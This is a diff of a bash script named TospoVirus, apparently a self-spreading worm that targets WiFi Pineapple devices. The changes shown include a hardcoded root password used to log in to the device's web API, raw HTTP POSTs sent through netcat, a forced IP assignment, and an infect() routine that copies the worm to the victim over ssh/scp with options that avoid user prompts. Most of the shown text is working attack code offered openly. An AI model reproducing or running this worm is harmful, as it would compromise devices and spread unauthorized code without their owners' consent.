@@ -1,11 +1,11 @@
 #!/bin/bash
-#Creating TospoVirus: Weaponizing vulnerabilities for fun and... just fun.
+#TospoVirus: Weaponizing vulnerabilities for fun and... just fun.
 #Author: 
 #   twitter @catatonicprime 
 #   email (guess)
 #
 #n00b comments provided by:
-#ActualReverend   
+#   ActualReverend
 
 creds="username=root&password=pineapplesareyummy&login="
 sessid="tospovirus"
@@ -118,7 +118,7 @@ connect() {
 	#Forget about the IP just use this one.
 	
 	#TODO: Disable pulling with DHCP if possible?
-	#ifconfig wlan1 172.16.42.146
+	ifconfig wlan1 172.16.42.146
 }
 
 
@@ -127,14 +127,14 @@ connect() {
 # $2 - Post Data  
 # $3 - Session ID
 #An HTTP post looks like this:
-#POST /some/page.php HTTP/1.1
-#Host: 172.16.42.1:1471
-#Content-Type: application/x-www-form-urlencoded
-#Cookie: PHPSESSID=tospovirus|[somesessid]
-#Content-Length: len(data)
-#Connection: close
+#   POST /some/page.php HTTP/1.1
+#   Host: 172.16.42.1:1471
+#   Content-Type: application/x-www-form-urlencoded
+#   Cookie: PHPSESSID=tospovirus|[somesessid]
+#   Content-Length: len(data)
+#   Connection: close
 #
-#data=goes&here=true
+#   data=goes&here=true
 post() {
 	len=`printf "$2" | wc -c`
 	printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
@@ -157,7 +157,7 @@ bf() {
 #Once logged in other actions may be performed.
 login() {
 	echo "Logging in..."
-	post '/includes/api/login.php' "$creds" "$sessid" | grep -i 'invalid username' && echo "Login Failed..." && return 1
+	post '/includes/api/login.php' "$creds" "$sessid" | grep -i 'invalid username' && return 1
 	echo "Logged in Successfully!"
 	#return 0 - Succeeded!
 	return 0
@@ -175,7 +175,7 @@ infect() {
 	#This is where we successfully clone ourselves to the victim. The various -o Options
 	#are to avoid blocking errors which would require user-interaction. We want to simply
 	#ignore these options and so we decline or use /dev/null for file storage.
-	ssh $sshoptions 172.16.42.1 "mkdir -p /tospo" && scp $sshoptions -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
+	ssh $sshoptions 172.16.42.1 "mkdir -p /tospo" && scp $sshoptions -r /tospo/tv* 172.16.42.1:/tospo/
 }
 
 #Function used to execute SSH commands on the remote in order to establish future runtime
